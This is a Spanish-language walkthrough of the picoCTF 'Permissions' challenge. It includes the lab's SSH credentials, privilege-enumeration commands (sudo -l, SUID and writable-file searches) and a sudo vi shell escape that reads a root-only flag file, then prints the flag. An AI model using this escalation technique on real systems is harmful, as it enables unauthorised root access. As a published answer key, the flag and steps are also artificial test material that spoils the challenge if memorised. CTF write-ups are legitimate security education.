Permissions

## Descripción

Can you read files in the root file?
The system admin has provisioned an account for you on the main server:
ssh -p 58123 picoplayer@saturn.picoctf.net
Password: 33qE7mB5BF
Can you login and read the root file?

hint: What permissions do you have?

Se te da una cuenta en el servidor principal. El objetivo es conectarte y leer un fichero que sólo el usuario `root` normalmente puede leer. Debes determinar qué permisos tienes y si existe una forma de acceder a la información de root desde tu cuenta.

Credenciales provistas:
- Host: `saturn.picoctf.net`
- Puerto: `58123`
- Usuario: `picoplayer`
- Contraseña: `33qE7mB5BF`

## Solución (pasos reproducibles en CLI)

1) Conéctate al servidor (webshell/terminal):

```bash
ssh -p 58123 picoplayer@saturn.picoctf.net
# cuando solicite la contraseña, introduce: 33qE7mB5BF
```

2) Comprueba tu identidad y permisos básicos:

```bash
whoami           # usuario efectivo
id               # UID, GID y grupos
groups           # grupos a los que perteneces
```

3) Revisa privilegios `sudo` (si hay):

```bash
sudo -l          # muestra comandos permitidos por sudo
```

Si `sudo -l` muestra comandos ejecutables sin contraseña, puedes usarlos para leer archivos root. Por ejemplo, si ves `(/usr/bin/cat) NOPASSWD: /root/secret.txt`, puedes ejecutar `sudo /usr/bin/cat /root/secret.txt`.

En este reto, la salida de `sudo -l` a menudo da permiso para ejecutar `(/usr/bin/vi)` como root. Eso es suficiente para leer archivos protegidos porque `vi` permite ejecutar comandos shell con `:!`.

En el caso real, el vector concreto fue:

```bash
sudo /usr/bin/vi -c ':!cat /root/.flag.txt' -c ':q' /tmp/x
```

Esta línea aprovecha el permiso `sudo /usr/bin/vi` para ejecutar `cat /root/.flag.txt` como root y mostrar la flag. No se trata de dar permisos a `/root`, sino de usar el permiso que ya tienes para ejecutar un editor como root.

4) Inspecciona permisos del sistema y del directorio `/root`:

```bash
ls -ld /root
ls -la /root
# buscar ficheros legibles por otros dentro de /root
find /root -type f -perm -o=r -ls 2>/dev/null
```

Si hay ficheros en `/root` con permisos world-readable (`-r--r--r--`), podrás verlos con `cat /root/<file>`.

5) Buscar posibles vectores alternativos (archivos legibles en todo el sistema o SUID ejecutables que permitan escalada):

```bash
# archivos world-readable que podrían contener la flag
find / -type f -perm -o=r -path /proc -prune -o -ls 2>/dev/null | head -n 200

# binarios con bit SUID (posible escalada)
find / -perm -4000 -type f -ls 2>/dev/null

# cron jobs, ficheros temporales y directorios con escritura
ls -la /tmp
find / -writable -type d -ls 2>/dev/null | head -n 50
```

6) Si el reto incluye un hash o fichero con información (por ejemplo `/root/flag` o `/root/secret`), y no tienes lectura directa, comprueba si hay servicios o scripts que se ejecutan con privilegios elevados y que puedes manipular (por ejemplo, ficheros cron editables, scripts en directorios writables, etc.).

7) Lectura directa de la flag (si está accesible):

```bash
sudo cat /root/flag.txt        # si sudo permite
cat /root/flag.txt            # si es world-readable
```

En este caso específico:

El prompt te muestra:

Usuario: picoplayer
Contraseña: 33qE7mB5BF
Con esa contraseña inicias sesión SSH y también es la contraseña de tu cuenta para sudo, salvo que el sistema tenga otra configuración. Por eso pude decirte que usaras 33qE7mB5BF cuando sudo -l pidió contraseña. la flag no está en `/root/flag.txt`, sino en `/root/.flag.txt`. Con el permiso de `sudo /usr/bin/vi`, puedes leerla así:

```bash
sudo /usr/bin/vi -c ':!cat /root/.flag.txt' -c ':q' /tmp/x
```

Ese comando ejecuta `vi` como root y le pide que lance `cat /root/.flag.txt` dentro de la sesión de editor.

## Notas

El vector era sudo /usr/bin/vi:

sudo -l mostró que picoplayer puede ejecutar vi como root.
Usamos sudo vi para ejecutar comandos con privilegios root.
Listamos /root y descubrimos /root/.flag.txt.
Leímos el archivo con sudo vi -c ':!cat /root/.flag.txt' ....
Flag
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}

El hint “What permissions do you have?” significaba precisamente eso: descubre qué comandos te permite sudo tu usuario y aprovéchalos, no intentos de chmod sobre /root.

## Referencias

- `ssh` manual: https://www.openssh.com/manual.html
- `sudo -l` y privilegios: https://www.sudo.ws/man/1.8.13/sudo.man.html
- `find` para búsquedas de permisos: `man find`
